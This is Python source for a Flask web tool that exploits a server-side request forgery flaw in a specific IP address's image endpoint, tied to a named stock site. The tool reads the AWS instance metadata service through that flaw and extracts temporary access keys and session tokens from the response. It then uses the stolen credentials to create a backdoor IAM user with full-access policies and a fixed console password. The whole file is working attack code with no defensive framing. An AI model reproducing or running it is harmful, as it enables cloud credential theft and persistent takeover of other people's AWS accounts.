from flask import Flask, request, render_template, url_for
import requests
import base64
import os
import boto3
import json

app = Flask(__name__)

def send_request(image_url):
    url = "http://43.202.240.147:8080/api/user/image"
    params = {
        'imageUrl': image_url
    }
    headers = {
        'Host': '43.202.240.147:8080',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'ko-KR',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36',
        'Origin': 'http://www.nonamestock.com',
        'Referer': 'http://www.nonamestock.com/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }

    try:
        print(f"Sending request to: {url} with params: {params} and headers: {headers}")
        response = requests.get(url, headers=headers, params=params)
        response.raise_for_status()  # 요청이 성공했는지 확인
        print(f"Received response: {response.text}")
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return f"Error: {e}"

def decode_base64_data(base64_data):
    try:
        decoded_data = base64.b64decode(base64_data).decode('utf-8')
        return decoded_data
    except Exception as e:
        print(f"Error decoding image: {e}")
        return f"Error decoding image: {e}"

def process_response(response_text):
    decoded_data = decode_base64_data(response_text)
    cleaned_data = decoded_data.replace('{', '').replace('}', '').replace(',', '<br>')
    access_key, secret_key, session_token = "", "", ""

    if "AccessKeyId" in decoded_data:
        access_key = decoded_data.split('AccessKeyId')[1].split('"')[2].strip()
    if "SecretAccessKey" in decoded_data:
        secret_key = decoded_data.split('SecretAccessKey')[1].split('"')[2].strip()
    if "Token" in decoded_data:
        session_token = decoded_data.split('Token')[1].split('"')[2].strip()

    return f"<pre>{cleaned_data}</pre>", access_key, secret_key, session_token

def create_user_and_attach_policies(access_key, secret_key, session_token, username, region='us-east-1'):
    session = boto3.Session(
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        aws_session_token=session_token,
        region_name=region
    )
    
    logs = []
    try:
        iam = session.client('iam')
        
        iam.create_user(UserName=username)
        log_message = f'User {username} created successfully.'
        logs.append(log_message)
        print(log_message)

        policies = [
            'arn:aws:iam::aws:policy/IAMFullAccess',
            'arn:aws:iam::aws:policy/AmazonEC2FullAccess',
            'arn:aws:iam::aws:policy/AmazonS3FullAccess',
            'arn:aws:iam::aws:policy/AmazonRDSFullAccess',
            'arn:aws:iam::aws:policy/AmazonVPCFullAccess',
            'arn:aws:iam::aws:policy/AmazonSSMFullAccess'
        ]

        for policy_arn in policies:
            iam.attach_user_policy(UserName=username, PolicyArn=policy_arn)
            log_message = f'Policy {policy_arn} attached to user {username}.'
            logs.append(log_message)
            print(log_message)

        password = 'DefaultPassword123!'  
        iam.create_login_profile(
            UserName=username,
            Password=password,
            PasswordResetRequired=False
        )
        log_message = f'Login profile created for user {username}.'
        logs.append(log_message)
        print(log_message)

        account_id = session.client('sts').get_caller_identity().get('Account')
        login_url = f"https://{account_id}.signin.aws.amazon.com/console"
        log_message = f'User can login using the following link: {login_url}'
        logs.append(log_message)
        print(log_message)

        return username, password, "\n".join(logs), login_url

    except Exception as e:
        log_message = f'Error creating user or attaching policies: {e}'
        logs.append(log_message)
        print(log_message)
        return None, None, "\n".join(logs), None

@app.route('/')
def index():
    return render_template('index.html', result="", current_path="/latest/meta-data/", parent_path="/latest/", iam_result="", access_key="", secret_key="", session_token="")

@app.route('/explore', methods=['GET'])
def explore():
    path = request.args.get('path')
    current_path = request.args.get('current_path', '/latest/meta-data/')
    if path:
        if not path.startswith('/'):
            path = current_path.rstrip('/') + '/' + path
        if not path.endswith('/'):
            path += '/'
    else:
        path = current_path

    image_url = f"http://169.254.169.254{path}"
    print(f"Exploring metadata at path: {path}, image_url: {image_url}")
    response = send_request(image_url)
    result, access_key, secret_key, session_token = process_response(response)
    parent_path = os.path.dirname(path.rstrip('/')) + '/'
    if parent_path == '/':
        parent_path = '/latest/meta-data/'

    return render_template('index.html', result=result, current_path=path, parent_path=parent_path, iam_result="", access_key=access_key, secret_key=secret_key, session_token=session_token)

@app.route('/create_user', methods=['POST'])
def create_user():
    access_key = request.form.get('access_key')
    secret_key = request.form.get('secret_key')
    session_token = request.form.get('session_token')
    username = request.form.get('username')

    new_username, new_password, logs, login_url = create_user_and_attach_policies(access_key, secret_key, session_token, username)

    if new_username and new_password:
        iam_result = f'User {new_username} created with initial password {new_password}\n\nLogs:\n{logs}'
    else:
        iam_result = f'Failed to create user or attach policies.\n\nLogs:\n{logs}'

    return render_template('index.html', result="", current_path="/latest/meta-data/", parent_path="/latest/", iam_result=iam_result, access_key=access_key, secret_key=secret_key, session_token=session_token, login_url=login_url)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
